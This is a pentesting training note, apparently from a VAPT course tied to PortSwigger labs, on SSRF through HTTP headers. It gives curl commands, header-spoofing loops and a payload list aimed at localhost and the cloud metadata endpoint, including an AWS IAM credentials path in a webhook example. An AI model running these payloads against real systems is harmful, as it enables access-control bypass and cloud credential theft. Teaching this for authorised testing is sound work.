---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.04 SSRF via HTTP Headers (Host, Referer, X-Forwarded-For)"
portswigger_labs: ["SSRF with blacklist-based input filter"]
---

# 13.04 — SSRF via HTTP Headers

## Why Headers Can Cause SSRF

```
SOME APPS USE REQUEST HEADERS TO DETERMINE WHERE TO FETCH CONTENT:
  - Host header → virtual hosting, routing to backend
  - Referer → tracking, link preview generation
  - X-Forwarded-Host → CDN/reverse proxy routing
  - X-Custom-IP-Authorization → access control bypass
  
  When these headers contain URLs or hostnames that the app then
  fetches from, they become SSRF vectors!
```

---

## SSRF via Host Header

```
SCENARIO: App routes to different backends based on Host header

Request:
  GET /api/internal HTTP/1.1
  Host: evil.com
  
If app fetches: http://{Host}/api/internal → SSRF!
Or: reverse proxy uses Host to route → bypass access controls

TESTING:
  1. Change Host header to: localhost
  2. Change Host header to: 169.254.169.254
  3. Change Host header to: internal-service.company.local

NOTE: Changing Host header usually breaks the app's routing first.
      Better technique: use X-Forwarded-Host

PortSwigger Lab Scenario:
  GET /product?productId=1 HTTP/1.1
  Host: target.com
  
  → Change to: Host: localhost → server fetches from localhost!
  → Bypass of "admin only from localhost" check!
```

---

## SSRF via X-Forwarded-Host / X-Forwarded-For

```bash
# X-Forwarded-Host can change where app thinks the request came from:
curl -v "https://target.com/profile" \
  -H "X-Forwarded-Host: 169.254.169.254"

# X-Forwarded-For spoofing:
curl -v "https://target.com/admin" \
  -H "X-Forwarded-For: 127.0.0.1"
# If app allows admin access from 127.0.0.1 and trusts this header → bypass!

# OTHER HEADERS TO TRY:
headers=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-Host: localhost"
  "X-Real-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Host: 169.254.169.254"
  "X-Originating-IP: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
  "Client-IP: 127.0.0.1"
  "X-Custom-IP-Authorization: 127.0.0.1"
)

for header in "${headers[@]}"; do
  echo "Testing: $header"
  curl -s -o /dev/null -w "%{http_code}" \
    -H "$header" \
    "https://target.com/admin"
done
```

---

## SSRF via Referer Header

```
SCENARIO: App generates link previews or tracks referrals
  
  If app fetches the Referer URL to generate preview or log:
  Request:
    GET /article/123 HTTP/1.1
    Referer: http://169.254.169.254/latest/meta-data/
  
  App fetches the Referer URL → SSRF!
  
  COMMON IN:
  - Analytics tracking systems (fetch Referer page for context)
  - Link preview generators
  - Content recommendation engines
  - "Where did users come from" tracking

TESTING:
  1. Add: Referer: http://127.0.0.1/admin
  2. Add: Referer: http://169.254.169.254/latest/meta-data/
  3. Check if app fetches this URL (out-of-band via Burp Collaborator)
  4. If Burp Collaborator receives DNS/HTTP callback → BLIND SSRF via Referer!
```

---

## SSRF via Other Headers

```bash
# HEADERS THAT APPLICATIONS SOMETIMES FETCH:

# 1. X-Forwarded-Server (some apps use to fetch from "original" server):
curl -H "X-Forwarded-Server: 169.254.169.254" https://target.com/

# 2. Link header (HTTP Link relation):
curl -H "Link: <http://169.254.169.254/>; rel=\"preload\"" https://target.com/

# 3. Content-Location:
curl -H "Content-Location: http://169.254.169.254/" https://target.com/

# 4. Origin: (can cause app to fetch from "origin" for CORS validation):
curl -H "Origin: http://169.254.169.254/" https://target.com/

# 5. Custom headers specific to the app:
# Check app's API docs or source code for custom header processing

# TIP: Use Burp Collaborator payload in all headers!
# BURP → Burp Collaborator Client → Copy payload
# Add to EVERY header and see which one triggers a ping
```

---

## Automated Header SSRF Testing

```bash
# USE BURP INTRUDER OR CUSTOM SCRIPT:

# CREATE HEADER SSRF PAYLOAD LIST:
cat > header_ssrf.txt << 'EOF'
http://169.254.169.254/latest/meta-data/
http://127.0.0.1/admin
http://localhost/
http://[::1]/
http://0.0.0.0/
YOUR_BURP_COLLABORATOR_PAYLOAD
EOF

# FFUF FOR HEADER INJECTION:
for header in "Referer" "X-Forwarded-Host" "X-Forwarded-For" "Origin" "X-Real-IP"; do
  result=$(curl -s -I -H "$header: http://169.254.169.254/latest/meta-data/" \
    "https://target.com/api/profile")
  echo "$header: $result"
done

# BURP EXTENSION: Collaborator Everywhere
# Automatically injects Burp Collaborator payloads into ALL headers
# Great for discovering blind SSRF in headers!
```

---

## Combined Header Attack Example

```
REAL-WORLD SCENARIO:
  Target has a webhook system.
  When a user signs up, it sends a webhook to their registered URL.
  The webhook URL is taken from the request header.
  
  ATTACK:
  POST /signup HTTP/1.1
  X-Webhook-URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  
  {
    "email": "attacker@evil.com",
    "password": "pass123"
  }
  
  After signup, server sends webhook to the metadata endpoint!
  Response (AWS credentials) stored in webhook log?
  Or reflected in signup confirmation email?
```

---

## Related Notes
- [[01 - What is SSRF]] — fundamentals
- [[02 - Basic SSRF Fetching Internal URLs]] — localhost attacks
- [[07 - Blind SSRF]] — when you need Burp Collaborator
- [[09 - SSRF Cloud Metadata AWS]] — cloud credential theft
- [[Module 03 - HTTP Headers — Host Header]] — Host header attacks
